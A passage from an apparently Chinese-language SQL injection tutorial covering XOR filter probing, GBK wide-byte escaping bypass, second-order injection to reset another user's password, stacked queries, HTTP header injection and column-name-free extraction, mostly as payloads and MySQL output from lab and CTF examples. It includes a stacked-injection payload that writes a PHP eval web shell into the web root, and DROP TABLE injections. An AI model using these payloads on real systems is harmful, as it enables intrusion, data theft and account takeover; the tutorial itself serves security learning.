<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1=1 ^ 1=1 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=1 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   1 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1=2 xor 1=2 as res;</span><br><span class="line">+-----+</span><br><span class="line">| res |</span><br><span class="line">+-----+</span><br><span class="line">|   0 |</span><br><span class="line">+-----+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=2 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor 1=1 as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select null xor null as res;</span><br><span class="line">+------+</span><br><span class="line">| res  |</span><br><span class="line">+------+</span><br><span class="line">| NULL |</span><br><span class="line">+------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>常用手段：用于判断 所过滤的字符串</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(0)#</span></span><br><span class="line"><span class="string"># 得到正常的回显页面，由于异或之后得到 真</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(1)<span class="comment">#</span></span><br><span class="line"><span class="comment"># 得到错误的回显页面，由于异或之后得到 假</span></span><br></pre></td></tr></table></figure>

<p>常常用于判断我们所注入的某些字段是否被过滤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>union<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure>

<p>如果 <code>union</code> 已被过滤，那么得到的将会是 <code>length(0&gt;0)</code> ，显然是不成立的，那就将会是 <code>1&#39;^0</code> ，得到的为 真，所以将会返回 <strong>正常</strong> 的页面；</p>
<p>如果 <code>union</code> 没有被过滤，相反的，将会得到为假的异或，返回的将会是 <strong>错误</strong> 的页面。</p>
<p>由此可以判断某些字符的过滤情况。</p>
<p>常常使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>select<span class="string">&#x27;)&gt;0)#</span></span><br><span class="line"><span class="string">?id=1&#x27;</span>^(length(<span class="string">&#x27;and&#x27;</span>)&gt;0)<span class="comment">#</span></span><br><span class="line">?id=1<span class="string">&#x27;^(length(&#x27;</span>or<span class="string">&#x27;)&gt;0)#</span></span><br></pre></td></tr></table></figure>

<p><strong>符号特点：</strong></p>
<ul>
<li> <code>^</code> 运算符会做位异或运算</li>
</ul>
<p>  <img src="https://i.loli.net/2021/08/21/4yJYWol36IcDBx5.png" alt="image-20210821111344451"></p>
<ul>
<li><p><code>xor</code> 做逻辑运算 <code>1 xor 0</code> 会输出 1 ，其它情况输出其余所有数据</p>
<p><img src="https://i.loli.net/2021/08/21/tAPRi3nBOy7E2wc.png" alt="image-20210821111509785"></p>
</li>
</ul>
<h2 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h2><p><strong>防御原理</strong><br>为了防止 SQL注入漏洞，通常在源代码当中会对我们所输入的 SQL查询语句进行一个 转义 ，一般是对 单引号，双引号 进行一个转义变成 &#39; 或者是&quot;，这样Mysql在 执行 SQL语句时，不会影响到查询，即不会出现报错，数据存储在数据库当中时不会含有 \ ，也就是说，它仅仅是在执行 SQL语句时进行了转义，当我们从数据库中向外调出数据时并不会含有 \ ，也就预防了 SQL注入。</p>
<p><img src="https://i.loli.net/2021/08/20/iSje8ohEVHtCO2M.png" alt="在这里插入图片描述"></p>
<p>如果我们不进行转义，按照一般 攻击者的思路进行 SQL注入，都是通过 ?id=1’ 进行验证，如下图，如果没有进行任何防御，即没有进行转义操作，就会出现报错，也就很容易的验证出来了 的确存在 SQL注入，并且容易看到注入方式。</p>
<p><img src="https://i.loli.net/2021/08/20/Y2sylgcHtZCRh84.png" alt="在这里插入图片描述"></p>
<p><strong>常使用的 转义函数：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">    单引号（<span class="string">&#x27;）</span></span><br><span class="line"><span class="string">    双引号（&quot;）</span></span><br><span class="line"><span class="string">    反斜杠（\）</span></span><br><span class="line"><span class="string">    NULL</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">mysql_real_escape_string() 函数: 转义 SQL 语句中使用的字符串中的特殊字符</span></span><br><span class="line"><span class="string">下列字符受影响：</span></span><br><span class="line"><span class="string">    \x00</span></span><br><span class="line"><span class="string">    \n</span></span><br><span class="line"><span class="string">    \r</span></span><br><span class="line"><span class="string">    \</span></span><br><span class="line"><span class="string">    &#x27;</span></span><br><span class="line">    <span class="string">&quot;</span></span><br><span class="line"><span class="string">    \x1a</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">addslashes()</span></span><br></pre></td></tr></table></figure>

<p><strong>解决：</strong></p>
<ul>
<li><p>网页连接数据库时，将字符编码设置为 <strong>GBK 编码集合</strong>，然后进行 SQL语句的拼接，进行数据库的查询。</p>
</li>
<li><p><strong>GBK编码采用 双字节编码，编码范围为 8140~FEFE</strong></p>
</li>
<li><p>转义字符 <code>\</code> 的编码是 <code>5c</code> ，其在 GBK的编码范围之内，如果我们在转义字符之前 提交一个同样在编码范围之内的字符，网页在解析时，就会将其与 后面的转义字符进行一个匹配，组成一个 双字节的 GBK编码的汉字，从而失去了转义的作用。</p>
</li>
<li><p><strong>常用方法：在使用单引号 或者 双引号之前添加 %df 字符</strong></p>
</li>
<li><p><strong>方法二：在使用单引号 或者 双引号之前添加 %aa%5c 字符</strong></p>
</li>
<li><p>解释：</p>
   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如:  ?id=1%aa%5c<span class="string">&#x27; </span></span><br><span class="line"><span class="string">其实是： ?id=1%aa\&#x27;</span> </span><br><span class="line">即： ?id=1%aa%\\\<span class="string">&#x27;</span></span><br><span class="line"><span class="string">其中 \ 是 %5c;  &#x27;</span> 是 %27</span><br><span class="line">数据库中做了转义处理之后变成：%aa%5c%5c%5c%27</span><br><span class="line">这样，%aa和%5c进行组合称为了一个汉字，%5c与%5c仍旧是 \\ ，而 %27(单引号) 就分离出来了</span><br></pre></td></tr></table></figure></li>
</ul>
<p><a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">GBK编码范围</a></p>
<h2 id="十二、二次注入"><a href="#十二、二次注入" class="headerlink" title="十二、二次注入"></a>十二、二次注入</h2><p><strong>根源在于：来发这信任从数据库中取出的数据都是无害的。</strong></p>
<blockquote>
<p><strong>原理</strong>：攻击者构造的恶意数据 存储在 数据库 后，恶意数据 被读取 并进入到 SQL查询语句 所导致的注入。<br>防御者可能在用户 输入 恶意数据时对其中的特殊字符进行了 <strong>转义处理</strong> ，但在恶意数据插入到数据库时被处理的数据又 <strong>被还原</strong> 并存储在数据库中，当Web程序 <strong>调用</strong> 存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>也就是说在应用程序中输入恶意造的数据库查询语句时会被转义，但是在数据库内部调用读取语句的时候又被还原。</strong></p>
</blockquote>
<blockquote>
<p><strong>二次注入步骤</strong>:<br>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了 <strong>转义处理</strong>，在<strong>写入数据库的时候又保留了原来的数据</strong>。<br>第二步：引用恶意数据<br><strong>开发者默认存入数据库的数据都是安全的，在进行查询即调用已存储在数据库中的数据时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</strong></p>
</blockquote>
<ul>
<li>一般结合 <strong>修改密码 功能点</strong>  进行利用</li>
</ul>
<p>举例：</p>
<ol>
<li><p>已知用户登陆时的查询  <code>login.php</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查询防御：login.php</span><br><span class="line">$username <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> mysql_real_escape_string($_POST[&quot;login_password&quot;]);</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>我们使用下面 <strong>用户登录</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Dumb</span></span><br></pre></td></tr></table></figure>

<p>则实际进行操作的语句成为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;Dumb\&#x27;&#x27; and password=&#x27;</span>Dumb<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于进行了 <code>mysql_real_escape_string</code> 转义，则不会引发 sql 注入，从而成功进行了防御</p>
</li>
<li><p>已知注册用户时的插入 <code>login_create.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">插入防御：login_create.php</span><br><span class="line"><span class="variable">$username</span>=  mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) ;</span><br><span class="line"><span class="variable">$pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into users ( username, password) values(\&quot;<span class="variable">$username</span>\&quot;, \&quot;<span class="variable">$pass</span>\&quot;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>我们 <strong>注册新的用户</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure>

<p>同样对我们输入的数据进行了转义处理，则实际操作语句是</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username 进行转义处理之后得到 Dumb\<span class="string">&#x27;#，代入，即</span></span><br><span class="line"><span class="string">insert into users ( username, password) values(\&quot;Dumb\&#x27;</span><span class="comment">#\&quot;, \&quot;123456\&quot;)</span></span><br></pre></td></tr></table></figure>

<p>这样我们成功注册了一个新的用户 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">123456</span></span><br></pre></td></tr></table></figure></li>
<li><p>已知用户修改密码  <code>pass_change.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="variable">$pass</span>&#x27; where username=&#x27;<span class="variable">$username</span>&#x27; and password=&#x27;<span class="variable">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到，此时的用户名没有进行转义防御就出现在了sql语句当中</p>
</li>
<li><p>我们以新注册的 <code>Dumb&#39;#</code> 用户登录进去，利用修改密码的功能</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dumb<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">654321</span></span><br><span class="line"><span class="string">654321</span></span><br></pre></td></tr></table></figure>

<p>代入 sql 语句中得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;654321&#x27;</span> <span class="built_in">where</span> username=<span class="string">&#x27;Dumb&#x27;</span><span class="comment">#&#x27; and password=&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样看来，我们实际上修改的是 用户名为 <code>Dumb</code> 的密码</p>
</li>
<li><p>这样我们就在只以知某一用户名，不知其密码的情况下，通过 <strong>二次注入</strong> ，成功的可以登录其它用户的账号了</p>
</li>
</ol>
<h2 id="十三、堆叠注入"><a href="#十三、堆叠注入" class="headerlink" title="十三、堆叠注入"></a>十三、堆叠注入</h2><p>SQL语句书写时，以 分号 <code>;</code> 表示一条SQL语句结束，通过使用分号同时执行多条 SQL语句 即为 <code>堆叠注入</code> 。该注入可修改数据库的任意结构和数据。</p>
<p>测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;create table  qwe like users;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.04 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| qwe                |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> id= 1;drop table  qwe;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | Dumb     | Dumb     |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+--------------------+</span><br><span class="line">| Tables_in_security |</span><br><span class="line">+--------------------+</span><br><span class="line">| emails             |</span><br><span class="line">| referers           |</span><br><span class="line">| uagents            |</span><br><span class="line">| users              |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>

<p><strong>堆叠注入写一句话木马文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a<span class="string">&#x27;;select &#x27;</span>&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[111]); ?&gt;<span class="string">&#x27; into outfile &#x27;</span>/var/www/html/hacker.php<span class="string">&#x27;;--+</span></span><br></pre></td></tr></table></figure>



<p><strong>题例：[GYCTF2020]Blacklist1</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1<span class="string">&#x27; order by 2#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show databases;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;select database();#</span></span><br><span class="line"><span class="string">1&#x27;</span>;show tables;</span><br><span class="line">1<span class="string">&#x27;;show columns from 表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>create table 新表名 like 已知表名;<span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27;;drop table 新表名;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;handler 表名 open;handler 表名 <span class="built_in">read</span> first;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h2 id="十四、HTTP-头部注入"><a href="#十四、HTTP-头部注入" class="headerlink" title="十四、HTTP 头部注入"></a>十四、HTTP 头部注入</h2><h3 id="14-1-User-Agent-注入"><a href="#14-1-User-Agent-注入" class="headerlink" title="14.1 User-Agent 注入"></a>14.1 User-Agent 注入</h3><p>源码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p>
<p>抓包，修改 User-Agent 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-Agent:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;, <span class="variable">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="14-2-Referer-注入"><a href="#14-2-Referer-注入" class="headerlink" title="14.2 Referer 注入"></a>14.2 Referer 注入</h3><p>源码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="variable">$uagent</span>&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>同样的道理：当将 客户端可控的 <code>$uagent</code> 带入代入 <code>$insert</code> sql 语句时，必须将紧随其后的 单引号先闭合</p>
<p>抓包，修改 Referer 值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Referer:a<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样代进去即为</span></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;<span class="variable">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="14-3-Cookie-注入"><a href="#14-3-Cookie-注入" class="headerlink" title="14.3 Cookie 注入"></a>14.3 Cookie 注入</h3><p>如今绝大部门开发人员在开发过程中会对用户传入的参数进行适当的过滤，但是很多时候，由于个人对安全技术了解的不同，有些开发人员只会对get，post这种方式提交的数据进行参数过滤。</p>
<p>但我们知道，很多时候，提交数据并非仅仅只有get / post这两种方式，还有一种经常被用到的方式：request(“xxx”),即request方法。通过这种方法一样可以从用户提交的参数中获取参数值。</p>
<p><strong>这就造成了cookie注入的最基本条件：使用了request方法，但是只对用户get / post提交的数据进行过滤。</strong></p>
<p>例如：<code>www.xx.com/search.asp?id=1</code></p>
<p>访问：<code>www.xx.com/srarch.asp</code>　发现不能访问，说缺少id参数。</p>
<p>我们试着将id=1放在cookie中再次访问，查看能否访问，如果能访问，则说明id参数可以通过cookie提交。</p>
<p>那么，如果后端没有对cookie中传入的数据进行过滤，那么，这个网站就有可能存在cookie注入了！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$username</span>;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="variable">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="十五、无列名注入"><a href="#十五、无列名注入" class="headerlink" title="十五、无列名注入"></a>十五、无列名注入</h2><p> Mysql 版本 &gt; 5 时，都会存在一个元数据库 <code>information_schema</code> ，其中记录着 mysql 所有库、以及表的结构，我们通常的 sql 注入手段即是通过该元数据库来获取到其它库以及表的信息。那如果这个 <code>information_schema</code> 被过滤掉了该怎么办？</p>
<h3 id="15-1-使用别的具有类似功能的库"><a href="#15-1-使用别的具有类似功能的库" class="headerlink" title="15.1 使用别的具有类似功能的库"></a>15.1 使用别的具有类似功能的库</h3><p>除了 <code>information_schema</code> 中存在 <code>tables  schemata  columns  </code> 等表的信息外，在高版本当中还存在 <code>INNODB_TABLES</code>  <code>INNODS_COLUMNS</code> 中也记录着表的结构。</p>
<h4 id="15-1-1-sys-数据库"><a href="#15-1-1-sys-数据库" class="headerlink" title="15.1.1 sys 数据库"></a>15.1.1 sys 数据库</h4><ul>
<li><p><strong>利用mysql5.7新增的 sys.schema_auto_increment_columns</strong></p>
<p>基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</p>
<p>关于该表的视图    <a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html</a></p>
<p><img src="https://i.loli.net/2021/07/26/WcsAFo4brvGk1HQ.png" alt="image-20210726115705011"></p>
</li>
<li><p><strong>sys.schema_table_statistics_with_buffer</strong></p>
<p><img src="https://i.loli.net/2021/07/26/lIYZEAwComGO9an.png" alt="image-20210726115902236"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 利用语句</span><br><span class="line"></span><br><span class="line">#查数据库</span><br><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_auto_increment_columns;　　</span><br><span class="line">#查表</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database();　　</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure>

<p>类似的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">与它表结构相似的视图还有</span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics_with_buffer</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$schema_table_statistics</span></span><br><span class="line"></span><br><span class="line">    sys.x<span class="variable">$ps_schema_table_statistics_io</span></span><br><span class="line">    </span><br><span class="line">参考：https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-redundant-indexes.html</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/26/waSdL9Z8jpWcKbQ.png" alt="image-20210726120047304"></p>
</li>
</ul>
<h4 id="15-1-2-mysql-默认存储引擎-INNODB-所携带的表"><a href="#15-1-2-mysql-默认存储引擎-INNODB-所携带的表" class="headerlink" title="15.1.2 mysql 默认存储引擎 INNODB 所携带的表"></a>15.1.2 mysql 默认存储引擎 INNODB 所携带的表</h4><ul>
<li><strong>mysql.innodb_table_stats</strong></li>
<li><strong>mysql.innodb_index_stats</strong></li>
</ul>
<p><img src="https://i.loli.net/2021/07/26/y9D2XuApPm5wYGW.png" alt="image-20210726120244786"></p>
<p><img src="https://i.loli.net/2021/07/26/YR5okn6FbNxaZBQ.png" alt="image-20210726120309138"></p>
<h3 id="15-2-union-select-构造虚表"><a href="#15-2-union-select-构造虚表" class="headerlink" title="15.2 union select 构造虚表"></a>15.2 union select 构造虚表</h3><p>实验：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from `users`;</span><br><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 union select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| 1  | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | 321        |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | Dummy<span class="string">&#x27;#  | 123        |</span></span><br><span class="line"><span class="string">+----+----------+------------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 我们将列名替换成为了 数字 1,2,3</span></span><br><span class="line"><span class="string"># 那么我们就可以使用数字来对应其中的列名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select `2` from (select 1,2,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 这时我们已经取到了第二列的内容</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 当 `` 被过滤时，使用别名代替</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select b from (select 1,2 as b,3 union select * from users)a;</span><br><span class="line">+----------+</span><br><span class="line">| b        |</span><br><span class="line">+----------+</span><br><span class="line">| 2        |</span><br><span class="line">| Dumb     |</span><br><span class="line">| Angelina |</span><br><span class="line">| Dummy    |</span><br><span class="line">| secure   |</span><br><span class="line">| stupid   |</span><br><span class="line">| superman |</span><br><span class="line">| batman   |</span><br><span class="line">| admin    |</span><br><span class="line">| admin1   |</span><br><span class="line">| admin2   |</span><br><span class="line">| admin3   |</span><br><span class="line">| dhakkan  |</span><br><span class="line">| admin4   |</span><br><span class="line">| Dummy<span class="string">&#x27;#  |</span></span><br><span class="line"><span class="string">+----------+</span></span><br><span class="line"><span class="string">15 rows in set (0.00 sec)</span></span><br></pre></td></tr></table></figure>

